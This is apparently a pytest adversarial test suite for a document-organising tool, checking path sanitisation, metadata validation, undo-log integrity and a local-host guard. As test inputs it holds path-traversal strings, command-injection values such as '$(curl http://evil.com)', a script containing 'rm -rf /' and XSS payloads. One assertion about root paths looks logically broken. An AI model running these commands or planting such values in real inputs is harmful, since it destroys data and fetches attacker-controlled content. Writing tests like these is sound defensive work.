"""Master adversarial suite for Inbox Organizer — every test attacks a stated claim.

Test categories:
  A. Path Traversal & Filename Sanitization
  B. Malicious Document Content
  C. Metadata Injection & Forgery
  D. Undo Log Tampering
  E. Apex Router Security
  F. Edge Case Inputs
"""

from __future__ import annotations

import pathlib

import pytest

try:
    from hypothesis import HealthCheck, given, settings
    from hypothesis import strategies as st

    HYPOTHESIS_AVAILABLE = True
except ImportError:
    HYPOTHESIS_AVAILABLE = False
    given = lambda *a, **kw: lambda f: f
    settings = lambda *a, **kw: lambda f: f
    st = None
    HealthCheck = None

from axelr.core import DocumentMetadata, UndoEntry, _safe_segment, _target_path

# ══════════════════════════════════════════════════════════════════════════
# A. Path Traversal & Filename Sanitization
# ══════════════════════════════════════════════════════════════════════════


@pytest.mark.parametrize(
    "bad_path",
    [
        "../../etc/passwd",
        "..\\..\\windows\\system32",
        "/absolute/path/outside",
        "file.exe",
        "file.bat",
        "file.sh",
        "`rm -rf /``",
        "$(curl http://evil.com)",
    ],
)
def test_a1_bad_filenames_sanitized(bad_path: str):
    """Dangerous filenames must be sanitized to safe segments."""
    safe = _safe_segment(bad_path)
    assert ".." not in safe
    assert "/" not in safe
    assert "\\" not in safe
    assert "`" not in safe
    assert "$" not in safe


@given(st.text(min_size=1, max_size=200))
@settings(max_examples=50, deadline=None, suppress_health_check=[HealthCheck.filter_too_much])
@pytest.mark.skipif(not HYPOTHESIS_AVAILABLE, reason="hypothesis not available")
def test_a2_any_input_sanitizes_to_safe_path(raw: str):
    """Any arbitrary input string must produce a safe, filesystem-compatible segment."""
    safe = _safe_segment(raw)
    assert len(safe) > 0
    assert all(c.isalnum() or c in "-_." for c in safe) or safe == "untitled"


def test_a3_target_path_never_escapes_root(inbox_root: pathlib.Path):
    """Target path must always be within the inbox root directory."""
    meta = DocumentMetadata(
        document_type="invoice",
        date="2026-11-03",
        sender="../../../etc",
        category="../../../../tmp",
        confidence=0.9,
    )
    dst = _target_path(inbox_root, meta, pathlib.Path("../../escape.txt"))
    assert inbox_root.resolve() in dst.resolve().parents
    assert not str(dst.resolve()).startswith(str(pathlib.Path("/")))


# ══════════════════════════════════════════════════════════════════════════
# B. Malicious Document Content
# ══════════════════════════════════════════════════════════════════════════


@pytest.mark.asyncio
async def test_b1_malicious_script_content_rejected(inbox_root: pathlib.Path):
    """Documents containing executable code must be handled safely."""
    from axelr.core import DocumentSkill

    malicious_content = """#!/bin/bash
rm -rf /
curl http://evil.com
"""
    src = inbox_root / "inbox" / "malicious.sh"
    src.write_text(malicious_content, encoding="utf-8")

    skill = await DocumentSkill.create(inbox_root)
    result = await skill.process_now(src)
    await skill.stop()

    assert result is not None
    assert inbox_root.resolve() in result.destination.resolve().parents if result.destination else True


@pytest.mark.asyncio
async def test_b2_xss_content_sanitized(inbox_root: pathlib.Path):
    """Documents containing XSS payloads must be handled safely."""
    from axelr.core import DocumentSkill

    xss_content = """INVOICE
Date: 2026-11-03
From: <script>alert('xss')</script>
Total: <img src=x onerror=alert(1)>
"""
    src = inbox_root / "inbox" / "xss.txt"
    src.write_text(xss_content, encoding="utf-8")

    skill = await DocumentSkill.create(inbox_root)
    result = await skill.process_now(src)
    await skill.stop()

    assert result is not None
    if result.destination and pathlib.Path(result.destination).exists():
        content = pathlib.Path(result.destination).read_text(encoding="utf-8")
        assert "<script>" not in content


# ══════════════════════════════════════════════════════════════════════════
# C. Metadata Injection & Forgery
# ══════════════════════════════════════════════════════════════════════════


def test_c1_metadata_fields_validated():
    """Metadata must enforce strict type and format validation."""
    with pytest.raises(Exception):
        DocumentMetadata(
            document_type="invoice",
            date="invalid-date",
            sender="",
            category="",
            confidence=2.0,
        )

    meta = DocumentMetadata(
        document_type="invoice",
        date="2026-11-03",
        sender="Test",
        category="Invoices",
        confidence=1.5,
    )
    assert meta.confidence == 1.0


def test_c2_currency_normalized():
    """Currency codes must be normalized to uppercase ISO format."""
    from axelr.core import normalize_metadata

    meta = normalize_metadata(
        {
            "currency": "usd",
            "document_type": "invoice",
            "confidence": 0.9,
        }
    )
    assert meta["currency"] == "USD"

    meta = normalize_metadata(
        {
            "currency": "eur",
            "document_type": "invoice",
            "confidence": 0.9,
        }
    )
    assert meta["currency"] == "EUR"


# ══════════════════════════════════════════════════════════════════════════
# D. Undo Log Tampering
# ══════════════════════════════════════════════════════════════════════════


@pytest.mark.asyncio
async def test_d1_undo_log_integrity(inbox_root: pathlib.Path):
    """Undo log must maintain integrity even with tampered entries."""
    from axelr.core import UndoLog

    log_path = inbox_root / "undo.jsonl"
    log = UndoLog(log_path, max_entries=10)

    for i in range(5):
        await log.record(
            UndoEntry(
                op_id=f"op-{i}",
                timestamp=float(i),
                src=f"/a/{i}",
                dst=f"/b/{i}",
                filename=f"f{i}",
                category="Invoices",
                content_hash=f"h{i}",
            )
        )

    tampered_line = "invalid json line without proper format"
    with open(log_path, "a") as f:
        f.write(tampered_line + "\n")

    snap = await log.snapshot()
    assert len(snap) == 5


# ══════════════════════════════════════════════════════════════════════════
# E. Apex Router Security
# ══════════════════════════════════════════════════════════════════════════


def test_e1_local_host_guard():
    """Apex Router must only allow local host connections."""
    from axelr.apex_client import ApexRouterClient, CloudCallForbidden, _is_local_host

    assert _is_local_host("127.0.0.1") is True
    assert _is_local_host("localhost") is True
    assert _is_local_host("192.168.1.1") is True
    assert _is_local_host("8.8.8.8") is False

    with pytest.raises(CloudCallForbidden):
        ApexRouterClient(endpoint="http://8.8.8.8:11434")


# ══════════════════════════════════════════════════════════════════════════
# F. Edge Case Inputs
# ══════════════════════════════════════════════════════════════════════════


@pytest.mark.parametrize("empty_input", ["", "   ", "\n\n", "\t\t"])
def test_f1_empty_inputs_handled_safely(empty_input: str):
    """Empty or whitespace-only inputs must be handled gracefully."""
    safe = _safe_segment(empty_input)
    assert safe == "untitled"


def test_f2_extremely_long_filenames_handled():
    """Extremely long filenames must be truncated safely."""
    long_name = "A" * 1000
    safe = _safe_segment(long_name)
    assert len(safe) <= 255
    assert all(c.isalnum() for c in safe)


@pytest.mark.asyncio
async def test_f3_binary_files_handled(inbox_root: pathlib.Path):
    """Binary files must be handled without crashing."""
    from axelr.core import DocumentSkill

    binary_content = bytes([0x00, 0xFF, 0x00, 0xFF] * 1000)
    src = inbox_root / "inbox" / "binary.bin"
    src.write_bytes(binary_content)

    skill = await DocumentSkill.create(inbox_root)
    result = await skill.process_now(src)
    await skill.stop()

    assert result is not None
